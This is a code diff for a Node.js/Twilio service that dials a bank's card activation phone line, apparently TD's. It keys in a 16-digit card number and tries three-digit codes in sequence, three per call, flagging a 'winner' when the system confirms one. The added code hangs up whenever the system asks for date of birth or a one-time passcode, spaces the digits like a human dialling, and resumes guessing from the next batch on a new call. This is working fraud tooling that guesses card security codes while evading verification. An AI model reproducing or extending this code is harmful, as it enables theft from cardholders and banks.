@@ -81,7 +81,6 @@ export const getTwiML = async (req, res) => {
 const isAskingForCardPrompt = (speech) => {
   if (!speech) return false;
   const lower = speech.toLowerCase();
-  // Exclude brand greetings like "TD credit cards"
   if (lower === 'td credit cards.' || lower === 'td credit cards' || lower.includes('welcome to td')) {
     return false;
   }
@@ -107,7 +106,6 @@ const isAskingForCardPrompt = (speech) => {
 const isAskingForCodePrompt = (speech) => {
   if (!speech) return false;
   const lower = speech.toLowerCase();
-  // Exclude disclaimer / informational statements that mention "code" or "passcode"
   if (
     lower.includes('do not share this code') ||
     lower.includes('never call you for this code') ||
@@ -154,11 +152,67 @@ const isRepresentativeOrHoldTransfer = (speech) => {
   );
 };
 
+// Immediate Hangup Trigger 1: Date of Birth Prompt
+const isDOBPrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  return (
+    lower.includes('date of birth') ||
+    lower.includes("holder's date of birth") ||
+    lower.includes('contains a month and a year') ||
+    lower.includes('enter or say the 2 digit number') ||
+    lower.includes('2 digit number') ||
+    lower.includes('primary account')
+  );
+};
+
+// Immediate Hangup Trigger 2: One-Time Passcode Prompt
+const isOneTimePasscodePrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  return (
+    lower.includes('1 time passcode') ||
+    lower.includes('one time passcode') ||
+    lower.includes('easyweb profile') ||
+    lower.includes('confirm your identity') ||
+    lower.includes('skip 1 time passcode') ||
+    lower.includes('passcode via text') ||
+    lower.includes('passcode via phone') ||
+    lower.includes('messaging rates may apply')
+  );
+};
+
+// Activation Prompt Matcher
+const isActivationPrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  return (
+    lower.includes('activate your credit card') ||
+    lower.includes('to activate your credit card') ||
+    lower.includes('activate press 1') ||
+    lower.includes('activate your card') ||
+    lower.includes('to activate press 1')
+  );
+};
+
+// Incorrect Code Prompt Matcher
+const isIncorrectCodePrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  return (
+    lower.includes('incorrect') ||
+    lower.includes('invalid') ||
+    lower.includes('not recognized') ||
+    lower.includes('wrong') ||
+    lower.includes('try again') ||
+    lower.includes('unrecognized')
+  );
+};
+
 // Helper for 16-digit card human dialpad pacing (4-digit chunks with 0.5s pauses)
 const formatDtmfHumanDialpad = (cardDigits) => {
   const digitsOnly = cardDigits.replace(/\D/g, '');
   if (digitsOnly.length === 16) {
-    // Paces like human dialpad entry: w4520w3400w9797w2101
     return `w${digitsOnly.slice(0, 4)}w${digitsOnly.slice(4, 8)}w${digitsOnly.slice(8, 12)}w${digitsOnly.slice(12, 16)}`;
   }
   return `w${digitsOnly}`;
@@ -193,20 +247,49 @@ export const handleListenGreeting = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
     }).eq('id', attemptId);
 
-    // Check if IVR is explicitly asking for the card number
-    if (isAskingForCardPrompt(SpeechResult)) {
-      // ✅ IVR asked for card — send card DTMF instantly!
-      await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting 16-digit card number over DTMF: ${baseCard}`);
-      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${baseCard}` : `User (DTMF): ${baseCard}`;
+    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
+    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Hanging up call immediately.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR asks for Activation
+    if (isActivationPrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `IVR asked for card activation. Transmitting DTMF: 1`);
+      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): 1` : `User (DTMF): 1`;
       await supabase.from('attempts').update({
         result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
       }).eq('id', attemptId);
 
-      // Step 1: Play all 16 digits completely OUTSIDE gather so speech cannot interrupt digit transmission
-      const dialpadDigits = formatDtmfHumanDialpad(baseCard);
+      twiml.play({ digits: 'w1' });
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 10,
+        action: `${host}/api/call/listen-greeting/${attemptId}`,
+        method: 'POST'
+      });
+      gather.pause({ length: 2 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR is explicitly asking for the card number
+    if (isAskingForCardPrompt(SpeechResult)) {
+      const dtmfToSend = (baseCard && baseCard.length >= 15) ? baseCard : '1';
+      await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting DTMF: ${dtmfToSend}`);
+      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${dtmfToSend}` : `User (DTMF): ${dtmfToSend}`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
+      }).eq('id', attemptId);
+
+      const dialpadDigits = (baseCard && baseCard.length >= 15) ? formatDtmfHumanDialpad(baseCard) : 'w1';
       twiml.play({ digits: dialpadDigits });
 
-      // Step 2: Listen for Target IVR response after digits are transmitted
       const gather = twiml.gather({
         input: 'speech',
         speechTimeout: 'auto',
@@ -218,7 +301,6 @@ export const handleListenGreeting = async (req, res) => {
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
 
     } else {
-      // ⏳ IVR spoke something else (brand name, welcome message, etc.) — keep listening for card prompt
       await AttemptModel.addLog(attemptId, `IVR speaking (not card prompt yet). Listening again...`);
       const gather = twiml.gather({
         input: 'speech',
@@ -232,8 +314,7 @@ export const handleListenGreeting = async (req, res) => {
     }
 
   } else {
-    // No speech yet — keep listening for the IVR to ask for the card
-    await AttemptModel.addLog(attemptId, `No IVR speech detected yet. Listening for card prompt...`);
+    await AttemptModel.addLog(attemptId, `No IVR speech detected. Listening for card prompt...`);
     const gather = twiml.gather({
       input: 'speech',
       speechTimeout: 'auto',
@@ -277,7 +358,14 @@ export const handleListenCard = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
     }).eq('id', attemptId);
 
-    const lower = SpeechResult.toLowerCase();
+    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
+    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Hanging up call immediately.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
 
     // Check if IVR is transferring call to a live agent representative
     if (isRepresentativeOrHoldTransfer(SpeechResult)) {
@@ -291,6 +379,7 @@ export const handleListenCard = async (req, res) => {
     }
 
     // Check if IVR rejected the card number
+    const lower = SpeechResult.toLowerCase();
     if (lower.includes('invalid') || lower.includes('not recognized') || (lower.includes('try again') && lower.includes('card'))) {
       await AttemptModel.addLog(attemptId, `❌ 16-digit card number rejected by Target IVR. Halting campaign.`);
       await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Card rejected by Target IVR' });
@@ -301,57 +390,33 @@ export const handleListenCard = async (req, res) => {
       return res.send(twiml.toString());
     }
 
-    // Check if IVR is repeating/asking for card number again (e.g. if previous DTMF was sent too early)
-    if (isAskingForCardPrompt(SpeechResult)) {
-      await AttemptModel.addLog(attemptId, `IVR requested card number again. Re-transmitting card DTMF (Uninterruptible): ${baseCard}`);
-      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${baseCard}` : `User (DTMF): ${baseCard}`;
-      await supabase.from('attempts').update({
-        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
-      }).eq('id', attemptId);
-
-      const dialpadDigits = formatDtmfHumanDialpad(baseCard);
-      twiml.play({ digits: dialpadDigits });
-
-      const gather = twiml.gather({
-        input: 'speech',
-        speechTimeout: 'auto',
-        timeout: 12,
-        action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
-        method: 'POST'
-      });
-      gather.pause({ length: 3 });
-      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
-      res.type('text/xml');
-      return res.send(twiml.toString());
-    }
-
     // Check if IVR is asking for the test code / PIN
     if (isAskingForCodePrompt(SpeechResult)) {
-      // ✅ IVR asked for test code — send test code DTMF instantly!
-      await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit test code over DTMF: ${testCode}`);
+      const startCodeNum = parseInt(testCode, 10) || 1;
+      const startCodeStr = startCodeNum.toString().padStart(3, '0');
+
+      await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit code [1/3 in call] over DTMF: ${startCodeStr}`);
 
       const { data: freshAttempt } = await supabase.from('attempts').select('result_details').eq('id', attemptId).single();
       let freshTranscript = freshAttempt?.result_details?.transcript || currentTranscript;
-      freshTranscript = freshTranscript ? `${freshTranscript}\nUser (DTMF): ${testCode}` : `User (DTMF): ${testCode}`;
+      freshTranscript = freshTranscript ? `${freshTranscript}\nUser (DTMF): ${startCodeStr}` : `User (DTMF): ${startCodeStr}`;
       await supabase.from('attempts').update({
         result_details: { ...(freshAttempt?.result_details || attempt?.result_details || {}), transcript: freshTranscript }
       }).eq('id', attemptId);
 
-      // Play test code digits OUTSIDE gather
-      twiml.play({ digits: `w${testCode}` });
+      twiml.play({ digits: `w${startCodeStr}` });
 
       const gather = twiml.gather({
         input: 'speech',
         speechTimeout: 'auto',
         timeout: 12,
-        action: `${host}/api/call/listen-code/${attemptId}?testCode=${testCode}`,
+        action: `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=0`,
         method: 'POST'
       });
       gather.pause({ length: 3 });
-      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?testCode=${testCode}`);
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=0`);
 
     } else {
-      // ⏳ IVR is still speaking something else — keep listening
       await AttemptModel.addLog(attemptId, `IVR speaking (not code prompt yet). Listening again...`);
       const gather = twiml.gather({
         input: 'speech',
@@ -365,7 +430,6 @@ export const handleListenCard = async (req, res) => {
     }
 
   } else {
-    // No speech — keep listening for code prompt
     await AttemptModel.addLog(attemptId, `No IVR speech detected. Listening for code prompt...`);
     const gather = twiml.gather({
       input: 'speech',
@@ -382,44 +446,106 @@ export const handleListenCard = async (req, res) => {
   return res.send(twiml.toString());
 };
 
-// Stage 4: IVR test code response captured. Check for winner, log, and hangup.
+// Stage 4: IVR test code response captured. Handles in-call 3-code retries (001 -> 002 -> 003).
 export const handleListenCode = async (req, res) => {
   const { attemptId } = req.params;
   const { SpeechResult } = req.body || {};
-  const testCode = req.query.testCode || req.body.testCode || '001';
+  const startCodeNum = parseInt(req.query.startCodeNum || '1', 10);
+  const codeOffset = parseInt(req.query.codeOffset || '0', 10);
+
+  const currentCodeNum = startCodeNum + codeOffset;
+  const currentCodeStr = currentCodeNum.toString().padStart(3, '0');
+  const host = getHost(req);
 
   const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
+  const twiml = new twilio.twiml.VoiceResponse();
 
-  // Log real IVR code response speech
   if (SpeechResult && SpeechResult.trim() !== '') {
-    await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
+    await AttemptModel.addLog(attemptId, `IVR (Code Response for ${currentCodeStr}): "${SpeechResult}"`);
     const existing = attempt?.result_details?.transcript || '';
-    const updatedTranscript = existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
+    let updatedTranscript = existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
     await supabase.from('attempts').update({
       result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
     }).eq('id', attemptId);
+
+    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
+    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Hanging up call immediately.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
 
     // Check for victory keywords in IVR speech
     const lower = SpeechResult.toLowerCase();
     const isWinner = lower.includes('expiration') || lower.includes('expiry') || lower.includes('verified') || lower.includes('correct') || lower.includes('successful');
 
     if (isWinner) {
-      await AttemptModel.addLog(attemptId, `🎉 Target IVR confirmed winning code ${testCode}! Halting campaign.`);
+      await AttemptModel.addLog(attemptId, `🎉 Target IVR confirmed winning code ${currentCodeStr}! Halting campaign.`);
       await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
         ...(attempt?.result_details || {}),
-        winner: testCode,
+        winner: currentCodeStr,
         transcript: updatedTranscript
       });
       const OrchestratorService = await import('../services/orchestratorService.js');
       OrchestratorService.stopCampaign();
-    } else {
-      await AttemptModel.addLog(attemptId, `Call completed for code ${testCode}. Disconnecting call to dial next code...`);
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
     }
+
+    // Check if IVR says code was incorrect/invalid
+    if (isIncorrectCodePrompt(SpeechResult) || !isWinner) {
+      if (codeOffset < 2) {
+        // Try next code in the SAME call! (e.g. 001 -> 002, or 002 -> 003)
+        const nextOffset = codeOffset + 1;
+        const nextCodeNum = startCodeNum + nextOffset;
+        const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
+
+        await AttemptModel.addLog(attemptId, `IVR reported incorrect code (${currentCodeStr}). Trying code [${nextOffset + 1}/3 in call] over DTMF: ${nextCodeStr}`);
+        updatedTranscript = `${updatedTranscript}\nUser (DTMF): ${nextCodeStr}`;
+        await supabase.from('attempts').update({
+          result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
+        }).eq('id', attemptId);
+
+        twiml.play({ digits: `w${nextCodeStr}` });
+
+        const gather = twiml.gather({
+          input: 'speech',
+          speechTimeout: 'auto',
+          timeout: 12,
+          action: `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${nextOffset}`,
+          method: 'POST'
+        });
+        gather.pause({ length: 3 });
+        twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${nextOffset}`);
+
+        res.type('text/xml');
+        return res.send(twiml.toString());
+      } else {
+        // 3 codes (001, 002, 003) rejected in this call. Drop call to resume next batch (004)!
+        const nextBatchStartCode = (startCodeNum + 3).toString().padStart(3, '0');
+        await AttemptModel.addLog(attemptId, `❌ 3 test codes (${startCodeNum.toString().padStart(3, '0')}, ..., ${currentCodeStr}) rejected in this call. Hanging up to resume next batch (${nextBatchStartCode})...`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, {
+          ...(attempt?.result_details || {}),
+          transcript: updatedTranscript,
+          nextStartCode: nextBatchStartCode
+        });
+        twiml.hangup();
+        res.type('text/xml');
+        return res.send(twiml.toString());
+      }
+    }
+
   } else {
-    await AttemptModel.addLog(attemptId, `Call completed for code ${testCode}. Disconnecting call to dial next code...`);
+    // No speech response — hang up
+    await AttemptModel.addLog(attemptId, `No speech response for code ${currentCodeStr}. Disconnecting call...`);
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
   }
 
-  const twiml = new twilio.twiml.VoiceResponse();
   twiml.hangup();
   res.type('text/xml');
   return res.send(twiml.toString());
